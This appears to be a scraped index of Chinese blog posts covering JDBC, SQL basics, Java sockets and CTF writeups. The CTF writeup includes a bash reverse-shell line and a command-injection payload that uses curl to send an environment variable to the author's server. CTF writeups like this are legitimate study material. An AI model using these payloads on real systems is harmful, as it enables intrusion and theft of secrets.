/* Register the driver if it has not already been added to our list */ if(driver != null) { registeredDrivers.addIfAbsent(new DriverInfo(driver, da)); //在刚启动时，mysql实现的驱动会被加载，我们可以断点调试一下。 } else { // This is for compatibility with the original DriverManager throw new NullPointerException(); } println(\"registerDriver: \" + driver); } 我们可以通过调用getConnection()来进行数据库的链接： @CallerSensitive public static Connection getConnection(String url, String user, String password) throws SQLException { java.util.Properties info = new java.util.Properties(); if (user != null) { info.put(\"user\", user); } if (password != null) { info.put(\"password\", password); } return (getConnection(url, info, Reflection.getCallerClass())); //内部有实现 } 我们可以手动为驱动管理器添加一个日志打印： static { DriverManager.setLogWriter(new PrintWriter(System.out)); //这里直接设定为控制台输出 } ","date":"2024-03-04","objectID":"/articles/2024/03/jdbc-1/:4:0","tags":["JDBC","数据库","SQL"],"title":"JDBC-1-基础","uri":"/articles/2024/03/jdbc-1/"},{"categories":["SQL"],"content":"认识SQL语句 结构化查询语言（Structured Query Language）简称SQL，这是一种特殊的语言，它专门用于数据库的操作。每一种数据库都支持SQL，但是他们之间会存在一些细微的差异，因此不同的数据库都存在自己的“方言”。 SQL语句不区分大小写（关键字推荐使用大写），它支持多行，并且需要使用;进行结尾！ SQL也支持注释，通过使用--或是#来编写注释内容，也可以使用/*来进行多行注释。 我们要学习的就是以下四种类型的SQL语言： 数据查询语言（Data Query Language, DQL）基本结构是由SELECT子句，FROM子句，WHERE子句组成的查询块。 数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除，是开发以数据为中心的应用程序必定会使用到的指令。 数据库定义语言DDL(Data Definition Language)，是用于描述数据库中要存储的现实世界实体的语言。 DCL（Data Control Language）是数据库控制语言。是用来设置或更改数据库用户或角色权限的语句，包括（grant,deny,revoke等）语句。在默认状态下，只有sysadmin,dbcreator,db_owner或db_securityadmin等人员才有权力执行DCL。 我们平时所说的CRUD其实就是增删改查（Create/Retrieve/Update/Delete） ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:1:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"数据库定义语言（DDL） ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"数据库操作 我们可以通过create database来创建一个数据库： create database 数据库名 为了能够支持中文，我们在创建时可以设定编码格式： CREATE DATABASE IF NOT EXISTS 数据库名 DEFAULT CHARSET utf8 COLLATE utf8_general_ci; 如果我们创建错误了，我们可以将此数据库删除，通过使用drop database来删除一个数据库： drop database 数据库名 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:1","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"创建表 数据库创建完成后，我们一般通过create table语句来创建一张表： create table 表名(列名 数据类型[列级约束条件], 列名 数据类型[列级约束条件], ... [,表级约束条件]) ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:2","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"SQL数据类型 以下的数据类型用于字符串存储： char(n)可以存储任意字符串，但是是固定长度为n，如果插入的长度小于定义长度时，则用空格填充。 varchar(n)也可以存储任意数量字符串，长度不固定，但不能超过n，不会用空格填充。 以下数据类型用于存储数字： smallint用于存储小的整数，范围在 (-32768，32767) int用于存储一般的整数，范围在 (-2147483648，2147483647) bigint用于存储大型整数，范围在 (-9,223,372,036,854,775,808，9,223,372,036,854,775,807) float用于存储单精度小数 double用于存储双精度的小数 以下数据类型用于存储时间： date存储日期 time存储时间 year存储年份 datetime用于混合存储日期+时间 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:3","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"列级约束条件 列级约束有六种：主键Primary key、外键foreign key 、唯一 unique、检查 check （MySQL不支持）、默认default 、非空/空值 not null/ null ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:4","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"表级约束条件 表级约束有四种：主键、外键、唯一、检查 现在我们通过SQL语句来创建我们之前提到的三张表。 [CONSTRAINT \u003c外键名\u003e] FOREIGN KEY 字段名 [，字段名2，…] REFERENCES \u003c主表名\u003e 主键列1 [，主键列2，…] ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:5","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"修改表 如果我们想修改表结构，我们可以通过alter table来进行修改： ALTER TABLE 表名[ADD 新列名 数据类型[列级约束条件]] [DROP COLUMN 列名[restrict|cascade]] [ALTER COLUMN 列名 新数据类型] 我们可以通过ADD来添加一个新的列，通过DROP来删除一个列，不过我们可以添加restrict或cascade，默认是restrict，表示如果此列作为其他表的约束或视图引用到此列时，将无法删除，而cascade会强制连带引用此列的约束、视图一起删除。还可以通过ALTER来修改此列的属性。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:6","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"删除表 我们可以通过drop table来删除一个表： DROP TABLE 表名[restrict|cascade] 其中restrict和cascade上面的效果一致。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:2:7","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"数据库查询语言（DQL） 数据库的查询是我们整个数据库学习 中的重点内容，面对数据库中庞大的数据，该如何去寻找我们想要的数据，就是我们主要讨论的问题。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"单表查询 单表查询是最简单的一种查询，我们只需要在一张表中去查找数据即可，通过使用select语句来进行单表查询： -- 指定查询某一列数据 SELECT 列名[,列名] FROM 表名 -- 会以别名显示此列 SELECT 列名 别名 FROM 表名 -- 查询所有的列数据 SELECT * FROM 表名 -- 只查询不重复的值 SELECT DISTINCT 列名 FROM 表名 我们也可以添加where字句来限定查询目标： SELECT * FROM 表名 WHERE 条件 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:1","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"常用查询条件 一般的比较运算符，包括=、\u003e、\u003c、\u003e=、\u003c=、!=等。 是否在集合中：in、not in 字符模糊匹配：like，not like 多重条件连接查询：and、or、not 我们来尝试使用一下上面这几种条件。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:2","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"排序查询 我们可以通过order by来将查询结果进行排序： SELECT * FROM 表名 WHERE 条件 ORDER BY 列名 ASC|DESC 使用ASC表示升序排序，使用DESC表示降序排序，默认为升序。 我们也可以可以同时添加多个排序： SELECT * FROM 表名 WHERE 条件 ORDER BY 列名1 ASC|DESC, 列名2 ASC|DESC 这样会先按照列名1进行排序，每组列名1相同的数据再按照列名2排序。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:3","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"聚集函数 聚集函数一般用作统计，包括： count([distinct]*)统计所有的行数（distinct表示去重再统计，下同） count([distinct]列名)统计某列的值总和 sum([distinct]列名)求一列的和（注意必须是数字类型的） avg([distinct]列名)求一列的平均值（注意必须是数字类型） max([distinct]列名)求一列的最大值 min([distinct]列名)求一列的最小值 一般聚集函数是这样使用的： SELECT count(distinct 列名) FROM 表名 WHERE 条件 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:4","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"分组和分页查询 通过使用group by来对查询结果进行分组，它需要结合聚合函数一起使用： SELECT sum(*) FROM 表名 WHERE 条件 GROUP BY 列名 我们还可以添加having来限制分组条件： SELECT sum(*) FROM 表名 WHERE 条件 GROUP BY 列名 HAVING 约束条件 我们可以通过limit来限制查询的数量，只取前n个结果： SELECT * FROM 表名 LIMIT 数量 我们也可以进行分页： SELECT * FROM 表名 LIMIT 起始位置,数量 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:5","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"多表查询 多表查询是同时查询的两个或两个以上的表，多表查询会提通过连接转换为单表查询。 SELECT * FROM 表1, 表2 直接这样查询会得到两张表的笛卡尔积，也就是每一项数据和另一张表的每一项数据都结合一次，会产生庞大的数据。 SELECT * FROM 表1, 表2 WHERE 条件 这样，只会从笛卡尔积的结果中得到满足条件的数据。 注意： 如果两个表中都带有此属性吗，需要添加表名前缀来指明是哪一个表的数据。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:6","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"自身连接查询 自身连接，就是将表本身和表进行笛卡尔积计算，得到结果，但是由于表名相同，因此要先起一个别名： SELECT * FROM 表名 别名1, 表名 别名2 其实自身连接查询和前面的是一样的，只是连接对象变成自己和自己了。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:7","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"外连接查询 外连接就是专门用于联合查询情景的，比如现在有一个存储所有用户的表，还有一张用户详细信息的表，我希望将这两张表结合到一起来查看完整的数据，我们就可以通过使用外连接来进行查询，外连接有三种方式： 通过使用inner join进行内连接，只会返回两个表满足条件的交集部分： 通过使用left join进行左连接，不仅会返回两个表满足条件的交集部分，也会返回左边表中的全部数据，而在右表中缺失的数据会使用null来代替（右连接right join同理，只是反过来而已，这里就不再介绍了）： ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:8","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"嵌套查询 我们可以将查询的结果作为另一个查询的条件，比如： SELECT * FROM 表名 WHERE 列名 = (SELECT 列名 FROM 表名 WHERE 条件) 我们来再次尝试编写一下在最开始我们查找某教师所有学生的SQL语句。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:3:9","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"数据库控制语言（DCL） 庞大的数据库不可能由一个人来管理，我们需要更多的用户来一起管理整个数据库。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:4:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"创建用户 我们可以通过create user来创建用户： CREATE USER 用户名 identified by 密码; 也可以不带密码： CREATE USER 用户名; 我们可以通过@来限制用户登录的登录IP地址，%表示匹配所有的IP地址，默认使用的就是任意IP地址。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:4:1","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"登陆用户 首先需要添加一个环境变量，然后我们通过cmd去登陆mysql： login -u 用户名 -p 输入密码后即可登陆此用户，我们输入以下命令来看看能否访问所有数据库： show databases; 我们发现，虽然此用户能够成功登录，但是并不能查看完整的数据库列表，这是因为此用户还没有权限！ ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:4:2","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"用户授权 我们可以通过使用grant来为一个数据库用户进行授权： grant all|权限1,权限2...(列1,...) on 数据库.表 to 用户 [with grant option] 其中all代表授予所有权限，当数据库和表为*，代表为所有的数据库和表都授权。如果在最后添加了with grant option，那么被授权的用户还能将已获得的授权继续授权给其他用户。 我们可以使用revoke来收回一个权限： revoke all|权限1,权限2...(列1,...) on 数据库.表 from 用户 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:4:3","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"视图 视图本质就是一个查询的结果，不过我们每次都可以通过打开视图来按照我们想要的样子查看数据。既然视图本质就是一个查询的结果，那么它本身就是一个虚表，并不是真实存在的，数据实际上还是存放在原来的表中。 我们可以通过create view来创建视图; CREATE VIEW 视图名称(列名) as 子查询语句 [WITH CHECK OPTION]; WITH CHECK OPTION是指当创建后，如果更新视图中的数据，是否要满足子查询中的条件表达式，不满足将无法插入，创建后，我们就可以使用select语句来直接查询视图上的数据了，因此，还能在视图的基础上，导出其他的视图。 若视图是由两个以上基本表导出的，则此视图不允许更新。 若视图的字段来自字段表达式或常数，则不允许对此视图执行INSERT和UPDATE操作，但允许执行DELETE操作。 若视图的字段来自集函数，则此视图不允许更新。 若视图定义中含有GROUP BY子句，则此视图不允许更新。 若视图定义中含有DISTINCT短语，则此视图不允许更新。 若视图定义中有嵌套查询，并且内层查询的FROM子句中涉及的表也是导出该视图的基本表，则此视图不允许更新。例如将成绩在平均成绩之上的元组定义成一个视图GOOD_SC： CREATE VIEW GOOD_SC AS SELECT Sno, Cno, Grade FROM SC WHERE Grade \u003e (SELECT AVG(Grade) FROM SC); 导出视图GOOD_SC的基本表是SC，内层查询中涉及的表也是SC，所以视图GOOD_SC是不允许更新的。 一个不允许更新的视图上定义的视图也不允许更新 通过drop来删除一个视图： drop view apptest ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:5:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"索引 在数据量变得非常庞大时，通过创建索引，能够大大提高我们的查询效率，就像Hash表一样，它能够快速地定位元素存放的位置，我们可以通过下面的命令创建索引： -- 创建索引 CREATE INDEX 索引名称 ON 表名 (列名) -- 查看表中的索引 show INDEX FROM student 我们也可以通过下面的命令删除一个索引： drop index 索引名称 on 表名 虽然添加索引后会使得查询效率更高，但是我们不能过度使用索引，索引为我们带来高速查询效率的同时，也会在数据更新时产生额外建立索引的开销，同时也会占用磁盘资源。 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:6:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"触发器 触发器就像其名字一样，在某种条件下会自动触发，在select/update/delete时，会自动执行我们预先设定的内容，触发器通常用于检查内容的安全性，相比直接添加约束，触发器显得更加灵活。 触发器所依附的表称为基本表，当触发器表上发生select/update/delete等操作时，会自动生成两个临时的表（new表和old表，只能由触发器使用） 比如在insert操作时，新的内容会被插入到new表中；在delete操作时，旧的内容会被移到old表中，我们仍可在old表中拿到被删除的数据；在update操作时，旧的内容会被移到old表中，新的内容会出现在new表中。 CREATE TRIGGER 触发器名称 [BEFORE|AFTER] [INSERT|UPDATE|DELETE] ON 表名/视图名 FOR EACH ROW DELETE FROM student WHERE student.sno = new.sno FOR EACH ROW表示针对每一行都会生效，无论哪行进行指定操作都会执行触发器！ 通过下面的命令来查看触发器： SHOW TRIGGERS 如果不需要，我们就可以删除此触发器： DROP TRIGGER 触发器名称 ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:7:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["SQL"],"content":"事务 当我们要进行的操作非常多时，比如要依次删除很多个表的数据，我们就需要执行大量的SQL语句来完成，这些数据库操作语句就可以构成一个事务！只有Innodb引擎支持事务，我们可以这样来查看支持的引擎： SHOW ENGINES; MySQL默认采用的是Innodb引擎，我们也可以去修改为其他的引擎。 事务具有以下特性： 原子性： 一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。 一致性： 在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。 隔离性： 数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。 持久性： 事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。 我们通过以下例子来探究以下事务： begin; #开始事务 ... rollback; #回滚事务 savepoint 回滚点; #添加回滚点 rollback to 回滚点; #回滚到指定回滚点 ... commit; #提交事务 -- 一旦提交，就无法再进行回滚了！ ","date":"2024-03-03","objectID":"/articles/2024/03/sql/:8:0","tags":["SQL","数据库"],"title":"SQL基础","uri":"/articles/2024/03/sql/"},{"categories":["Java"],"content":"Socket技术 Socket技术也被称为套接字，是操作系统底层提供的一项通信技术，同时支持TCP和UDP。要实现Socket通信，我们必须创建一个数据发送者和一个数据接收者，也就是客户端和服务端，我们需要提前启动服务端，来等待客户端的连接，而客户端只需要随时启动去连接服务端即可！ 使用Java启动Socket服务端对象： import java.io.IOException; import java.net.ServerSocket; import java.net.Socket; public class Server { public static void main(String[] args) { try(ServerSocket server = new ServerSocket(8080)) { System.out.println(\"Waiting for client...\"); while (true) { Socket socket = server.accept(); System.out.println(\"Client has connected! The ip is: \" + socket.getInetAddress().getHostAddress()); } }catch (IOException e) { System.out.println(\"Server error!\"); e.printStackTrace(); } } } 创建客户端（实际上就是连接服务端的套接字而已） import java.io.IOException; import java.net.Socket; public class Client { public static void main(String[] args) { try (Socket socket = new Socket(\"localhost\",8080)) { System.out.println(\"Connection established!\"); } catch (IOException e) { System.out.println(\"Connection error!\"); e.printStackTrace(); } } } 实际上，建立Socket的过程就是TCP三次握手的过程： 通过在accept()阶段加上循环，就可以实现接受多个客户端的连接。 ","date":"2024-03-02","objectID":"/articles/2024/03/javaee-socket/:1:0","tags":["Java","JavaEE","Socket"],"title":"JavaEE Socket基础","uri":"/articles/2024/03/javaee-socket/"},{"categories":["Java"],"content":"使用Socket进行数据传输 Socket对象提供了对应的输入输出IO流进行网络数据传输。为了不用一个Byte的读取和发送数据，可以使用OutputStreamWriter和InputStreamReader来实现字符的输入和输出。同时可以使用BufferedReader缓冲字符流从缓冲区中读入数据。 服务端代码如下： import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.OutputStreamWriter; import java.net.ServerSocket; import java.net.Socket; public class Server { public static void main(String[] args) { try(ServerSocket server = new ServerSocket(8080)) { System.out.println(\"Waiting for client...\"); Socket socket = server.accept(); System.out.println(\"Client has connected! The ip is: \" + socket.getInetAddress().getHostAddress()); System.out.println(\"Waiting for the message...\"); BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream())); String message = reader.readLine(); System.out.println(\"Receive message from client: \" + message); OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream()); writer.write(\"Receive message: \" + message); writer.flush(); socket.close(); }catch (IOException e) { System.out.println(\"Server error!\"); e.printStackTrace(); } } } 客户端代码如下： import java.io.*; import java.net.Socket; import java.util.Scanner; public class Client { public static void main(String[] args) { try (Socket socket = new Socket(\"localhost\",8080); Scanner scanner = new Scanner(System.in)) { System.out.println(\"Connection established!\"); OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream()); String text = scanner.nextLine(); writer.write(text + '\\n'); writer.flush(); System.out.println(\"Text has been sent: \" + text); BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream())); System.out.println(\"Receive respond from server: \" + reader.readLine()); } catch (IOException e) { System.out.println(\"Connection error!\"); e.printStackTrace(); } } } 在服务器的设置上，可以手动关闭某个方向的流。 socket.shutdownOutput(); //关闭输出方向的流 socket.shutdownInput(); //关闭输入方向的流 同时可以通过调用setSoTimeout()设置超时时间： socket.setSoTimeout(3000); 如果连接的双方发生意外而通知不到对方，导致一方还持有连接，这样就会占用资源，因此我们可以使用setKeepAlive()方法来防止此类情况发生： socket.setKeepAlive(true); ","date":"2024-03-02","objectID":"/articles/2024/03/javaee-socket/:2:0","tags":["Java","JavaEE","Socket"],"title":"JavaEE Socket基础","uri":"/articles/2024/03/javaee-socket/"},{"categories":["Java"],"content":"使用Socket传输文件 由于提供了IO网络流，结合文件IO流就可以实现文件的传输。使用FileOutputStream和FileInputStream进行文件的输出和输入。 这里和IO部分的内容差不多，不再进行叙述。 ","date":"2024-03-02","objectID":"/articles/2024/03/javaee-socket/:3:0","tags":["Java","JavaEE","Socket"],"title":"JavaEE Socket基础","uri":"/articles/2024/03/javaee-socket/"},{"categories":["Java"],"content":"使用浏览器访问Socket服务器 HTTP协议是基于TCP协议的，如果使用HTTP协议访问Socket服务器，服务器就会收到一个HTTP请求： import java.io.*; import java.net.ServerSocket; import java.net.Socket; public class Server { public static void main(String[] args) { try(ServerSocket server = new ServerSocket(8080)) { System.out.println(\"Waiting for client...\"); Socket socket = server.accept(); System.out.println(\"Client has connected! The ip is: \" + socket.getInetAddress().getHostAddress()); InputStream stream = socket.getInputStream(); while (true) { int i = stream.read(); if (i == -1) break; System.out.print((char) i); } }catch (IOException e) { System.out.println(\"Server error!\"); e.printStackTrace(); } } } 打印出的请求如下： Waiting for client... Client has connected! The ip is: 127.0.0.1 GET / HTTP/1.1 Host: 127.0.0.1:8080 Connection: keep-alive sec-ch-ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: \"Windows\" Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate, br, zstd Accept-Language: zh-CN,zh;q=0.9 这就是一个标准的HTTP协议请求。但是由于Socket没有返回，所以浏览器不能正常显示页面。 ","date":"2024-03-02","objectID":"/articles/2024/03/javaee-socket/:4:0","tags":["Java","JavaEE","Socket"],"title":"JavaEE Socket基础","uri":"/articles/2024/03/javaee-socket/"},{"categories":["WriteUps"],"content":"0x01 签到 没什么好说的 ","date":"2024-01-26","objectID":"/articles/2024/01/hitctfwriteup/:1:0","tags":["CTF","Writeup"],"title":"HIT青训营结营比赛Writeup","uri":"/articles/2024/01/hitctfwriteup/"},{"categories":["WriteUps"],"content":"0x02 mix 这题大概的意思是给一个128*128的数组，找出其中异或和为1（128位全为1）的某些行。这里直接搜索的话大概要$2^{128}$肯定算不出来。由于flag的中间部分是128位二进制数，我们假设这128位为$x_0x_1…x_{127}$，将数组的第i行第j列设为$a_{ij}$，那么可以列出以下方程组： $a_{11}x_1⊗a_{12}x2⊗…a_{1_{127}}x_{127}=1 $ $a_{21}x_1⊗a_{22}x2⊗…a_{2_{127}}x_{127}=1 $ …… $a_{i1}x_1⊗a_{i2}x2⊗…a_{i_{127}}x_{127}=1 $ …… 这就可以看做一个异或方程组，增广矩阵是$[a^T,1]$（为什么要转置：是因为实际上是原数组每一列和flag相乘）。那么此时就可以使用高斯消元解出唯一的$x$解。首先使用python将$a$转置： A = A.splitlines() def invert_row(row): return ''.join('0' if ch == '1' else '1' for ch in row) def invert_matrix(A): return [invert_row(row) for row in A] def mix(a, b): return ''.join('0' if x == y else '1' for x, y in zip(a, b)) int_A = [[int(char) for char in row] for row in A] for i in range(128): for j in range(128): print(int_A[j][i],end=' ') 得到的结果储存在in.txt中，然后高斯消元求解： #include \u003ciostream\u003e #include \u003ccstdio\u003e #include \u003ccstring\u003e using namespace std; const int N = 130; int n; int a[N][N]; int gauss() { int r, c; for(r = 0, c = 0; c \u003c n; c ++) { int t = r; for(int i = r; i \u003c n; i ++) { if(a[i][c]) { t = i; break; } } if(!a[t][c]) continue; for(int i = c; i \u003c n + 1; i ++) swap(a[r][i], a[t][i]); for(int i = r + 1; i \u003c n; i ++) { if(a[i][c]) { for(int j = n; j \u003e= c; j --) { a[i][j] ^= a[r][j]; } } } r ++; } if(r \u003c n) { for(int i = r; i \u003c n; i ++) { if(a[i][n]) { return 2; } } return 1; } for(int i = n - 1; i \u003e= 0; i --) { for(int j = i + 1; j \u003c n; j ++) { a[i][n] ^= a[j][n] \u0026 a[i][j]; } } return 0; } int main() { freopen(\"in.txt\", \"r\", stdin); n = 128; for(int i = 0; i \u003c n; i ++) { for(int j = 0; j \u003c n; j ++) { scanf(\"%d\", \u0026a[i][j]); } } for (int i = 0;i \u003c n;++i) { a[i][128] = 1; } //增广矩阵 int t = gauss(); if(!t) for(int i = 0; i \u003c n; i ++) printf(\"%d\", a[i][n]); else if(t == 1) puts(\"Multiple sets of solutions\"); else puts(\"No solution\"); fclose(stdin); return 0; } 得到唯一解：11100010101100110011111101010001111010000110000100101101010110110110110011000110111101111101111110111011101011001010101101101011，由题目中的正则表达式得到，flag中为10进制的39位数字，转化后得到：301336232466272917408453747777662135147，刚好是39位，带入原题验证，成功解出flag。 ","date":"2024-01-26","objectID":"/articles/2024/01/hitctfwriteup/:2:0","tags":["CTF","Writeup"],"title":"HIT青训营结营比赛Writeup","uri":"/articles/2024/01/hitctfwriteup/"},{"categories":["WriteUps"],"content":"0x03 Yesterday Once More 打开图片发现，其中的图片是通过readfile.cgi文件显示的，而且由题目可知，我们可以查看/usr/local/apache2/htdocs/cgi-bin/文件夹下的内容。于是，发现了index.cgi文件的源码。 #!/bin/bash echo \"Content-type: text/html\" echo \"\" cat \u003c\u003cEOF \u003c!doctype html\u003e \u003chtml lang=\"en\" data-theme=\"dark\"\u003e …… 实际上是一个bash脚本，那我们也可以传上一个脚本来获得shell。可是直接上传的文件名会被重置为随机数。通过对处理上传的程序update.cgi进行逆向可知，如果上传文件的类型为hack/lilac则可以绕过文件名重置。 于是可以成功上传cgi文件。但此时访问则会显示500错误。猜测原因是上传的文件没有执行权限。在测试上传路径时候发现，可以通过..路径穿越上传到父文件夹。于是，想到覆盖有权限的文件，也就是index.cgi、readfile.cgi或upload.cgi这三个文件。但是覆盖后两者风险比较大，可能无法继续往后做题，于是选择覆盖index.cgi，同时需要注意在linux中完成，因为windows和linux的换行符不一样。 这里选择直接将index.cgi下载下来，（通过readfile.cgi文件），然后在其中加入以下语句： bash -i \u003e\u0026 /dev/tcp/124.223.190.186/9355 0\u003e\u00261 124.223.190.186是本人的vps地址，这里反弹shell纯粹是为了省事一点，不然每改一次命令就需要重新上传文件。 成功之后，访问index.cgi，成功得到shell。 根据提示，第一个flag在根目录，直接cat /flag解得第一个flag。 第二问确实是需要提权的，当时一直以为是suexec提权，其实不是，所以一直没做出来。最后的答案就在root的1进程中的环境变量中。 ","date":"2024-01-26","objectID":"/articles/2024/01/hitctfwriteup/:3:0","tags":["CTF","Writeup"],"title":"HIT青训营结营比赛Writeup","uri":"/articles/2024/01/hitctfwriteup/"},{"categories":["WriteUps"],"content":"0x04 bad_calculator 首先随便计算一个结果然后抓包，发现是在calc接口带入expr参数进行计算的： 那么首先想到的就是RCE。首先尝试了直接使用;和\u0026\u0026断句，发现没有成功。 这时想到bc的一般用法应该是echo \"3*5\" | bc，于是尝试闭合引号，这里试了两种引号，只有双引号可以。 此时想直接ls看看文件，发现出来的一大堆数字： 然后echo了一些东西，发现字母是不能输出的。 此时没有思路了，想着reverse shell到自己的VPS试一下，结果使用bash直接建立tcp连接失败了。而且不清楚原因。 偶然间试了下curl发现竟然可以收到GET请求。 题目提示是环境变量，那么试一试能不能带点东西出来，首先试下$PATH，发现可以。 但是，flag在什么环境变量里面了？根据测试赛和以往的经验，我依次尝试了flag、FLAG、FLAG1最终FLAG1成功带出flag。 最终Poc如下所示 http://camp.hitctf.cn:25657/calc ?expr=a\";curl http://124.223.190.186:9355/${FLAG1};echo \"5*4 ","date":"2024-01-26","objectID":"/articles/2024/01/hitctfwriteup/:4:0","tags":["CTF","Writeup"],"title":"HIT青训营结营比赛Writeup","uri":"/articles/2024/01/hitctfwriteup/"},{"categories":["Pwn"],"content":"这里只补一道Pwn，就是强网先锋的ez_fmt。这题可以说非常可惜，在最后半小时想到正确的思路，可是没时间写完了。当然，这题的设限其实非常多。先不谈只能一次fmt的问题，光是0x30的读入大小就非常恶心了。因为如此小的读入让人直觉上不可能去构造ROP，而是往one_gadget的方向想。可是对于一个6字节的64位地址，3次hn写入再加上3个8Byte的地址填充早就超过0x30的大小了。因此，利用gadgets构造ROP才是真正的解法。 ","date":"2023-12-19","objectID":"/articles/2023/12/qwb2023pwn/:0:0","tags":["Pwn","CTF","Writeup"],"title":"2023强网杯Pwn-WP","uri":"/articles/2023/12/qwb2023pwn/"},{"categories":["Pwn"],"content":"ez_fmt 题目如下： int __cdecl main(int argc, const char **argv, const char **envp) { char buf[88]; // [rsp+0h] [rbp-60h] BYREF unsigned __int64 v5; // [rsp+58h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); printf(\"There is a gift for you %p\\n\", buf); read(0, buf, 0x30uLL); if ( w == 0xFFFF ) { printf(buf); w = 0; } return 0; } 除了PIE保护全开。 